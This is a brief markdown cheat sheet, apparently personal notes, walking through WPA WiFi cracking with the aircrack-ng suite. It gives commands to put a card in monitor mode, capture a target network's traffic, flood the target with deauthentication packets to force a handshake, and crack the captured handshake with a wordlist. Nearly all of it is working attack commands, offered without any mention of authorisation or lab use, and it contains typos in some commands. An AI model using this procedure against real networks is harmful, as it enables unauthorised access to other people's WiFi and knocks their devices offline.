## Wifi Cracking 

### Enable Monitor Mode

#### Using aircrack-ng (airmon-ng)
```bash
sudo airmon-ng start wlan0
```

If some proccesses causing trouble kill them with

```bash
sudo airmon-ng check kill
```

### Listening Traffic

```bash
sudo airodump-ng wlan0mon
```

If airodump-ng not working

```bash
sudo ifconfig wlan0mon dowm
sudp ifconfig wlan0mon up
```

### Listening Target traffic 

```
sudo airodump-ng --bssid ff:ff:ff:ff:ff:ff --channel 2 --write capture wlan0mon
```

**--bssid / MAC Address: ** BSSID / MAC addr of Target 
**--channel: ** specify channel which wifi is on
**--write: ** output capture data in capture.cap file.

simanteously on new tab

### Deauthentication packets sending to target

```bash
sudo aireplay-ng --deauth 0 -a ff:ff:ff:ff:ff:ff wlan0mon
```

On airodump-ng tab, got `WPA Handshake` file close aireplay-ng and airodump-ng tab

Now just to crack the `WPA Handshake` file using wordlists
here we are using aircrack-ng pkg to crack the passwd (capture.cap)

```bash
sudo 
sudo aircrack-ng -b ff:ff:ff:ff:ff:ff -w wordlists.txt capture.cap 
```

If file not cracking passwd then try to use second capture file if its created during capturing `WPA Handshake`
